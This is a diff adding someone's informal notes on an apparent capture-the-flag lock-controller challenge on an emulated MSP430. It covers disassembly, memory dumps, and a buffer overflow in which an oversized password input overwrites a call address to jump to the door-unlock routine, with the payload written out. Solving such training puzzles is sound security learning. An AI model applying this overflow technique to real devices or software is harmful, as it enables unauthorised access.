@@ -186,3 +186,92 @@ DETAILS
 
 --------------------------------
 
+the
+interrupt 0x7D will pass a given password to the HSM, and will set a byte in
+memory if the password entered matches the stored password.
+
+The stored password can be reset by detaching the HSM from the lock and
+attaching it to the Model 1 reset device, also included.
+
+ The interrupt kind
+is passed in R2, the status register, on the high byte. Arguments are passed
+on the stack
+
+The door lock must be attached to output pin 7 of the MCU.
+This enables the CPU to trigger software interrupt 0x7F
+
+450c:  3f40 9c44      mov	#0x449c "Remember: passwords are between 8 and 16 characters.", r15
+4510:  b012 a645      call	#0x45a6 <puts>
+4514:  3e40 3000      mov	#0x30, r14
+
+primitives:
+password is said to be 8-16 chars long but buffer is 48 bytes
+
+test input 00112233445566778899aabbccddeeff
+
+input can overwrite memory
+
+input is stored at 0x43ee
+
+memory from 43ee:
+                                         43ee
+43e0: 7044 7d00 ee43 e843 0043 0000 2445 aaaa   pD}..C.C.C..$E..
+43f0: aaaa 0000 0000 0000 0000 0000 0000 3c44   ..............<D
+4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40   1@.D.B\.u.5..Z?@
+4410: 0000 0f93 0724 8245 5c01 2f83 9f4f d445   .....$.E\./..O.E
+4420: 0024 f923 3f40 0000 0f93 0624 8245 5c01   .$.#?@.....$.E\.
+4430: 1f83 cf43 0024 fa23 b012 0045 32d0 f000   ...C.$.#...E2...
+4440: fd3f 3040 d245 3012 7f00 b012 4245 2153   .?0@.E0....BE!S
+4450: 3041 0412 0441 2453 2183 c443 fcff 3e40   0A...A$S!..C..>@
+4460: fcff 0e54 0e12 0f12 3012 7d00 b012 4245   ...T....0.}...BE
+4470: 5f44 fcff 8f11 3152 3441 3041 456e 7465   _D....1R4A0AEnte
+4480: 7220 7468 6520 7061 7373 776f 7264 2074   r the password t
+4490: 6f20 636f 6e74 696e 7565 2e00 5265 6d65   o continue..Reme
+44a0: 6d62 6572 3a20 7061 7373 776f 7264 7320   mber: passwords 
+44b0: 6172 6520 6265 7477 6565 6e20 3820 616e   are between 8 an
+44c0: 6420 3136 2063 6861 7261 6374 6572 732e   d 16 characters.
+44d0: 0041 6363 6573 7320 6772 616e 7465 642e   .Access granted.
+44e0: 0054 6861 7420 7061 7373 776f 7264 2069   .That password i
+44f0: 7320 6e6f 7420 636f 7272 6563 742e 0000   s not correct...
+4500: 3150 f0ff 3f40 7c44 b012 a645 3f40 9c44   1P..?@|D...E?@.D
+4510: b012 a645 3e40 3000 0f41 b012 9645 0f41   ...E>@0..A...E.A
+4520: b012 5244 0f93 0524 b012 4644 3f40 d144   ..RD...$..FD?@.D
+4530: 023c 3f40 e144 b012 a645 3150 1000 3041   .<?@.D...E1P..0A
+           ^jumps here if input is incorrect
+                     ^this gets executed after incorrect input
+
+what i want to be executed:
+call #0x4446
+b0124644
+(calls unclock door)
+
+but i can only overwrite 48 bytes
+
+i can play with this:
+4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40
+4410: 0000 0f93 0724 8245 5c01 2f83 9f4f d445
+
+3140004415425c0175f335d0085a3f4000000f93072482455c012f839f4fd445
+3140 0044      mov	#0x4400, sp
+1542 5c01      mov	&0x015c, r5
+75f3           and.b	#-0x1, r5
+35d0 085a      bis	#0x5a08, r5
+3f40 0000      clr	r15
+0f93           tst	r15
+0724           jz	$+0x10
+8245 5c01      mov	r5, &0x015c
+2f83           decd	r15
+
+i can overwrite <__init_stack> <__low_level_init> and <__do_copy_data>
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644
+
+looking at the stack while trying to figure out a way to execute my code ive realized that i can overwrite a call address
+Just put 0x4446 there (unlock lock)
+
+
+
+
+
+
+
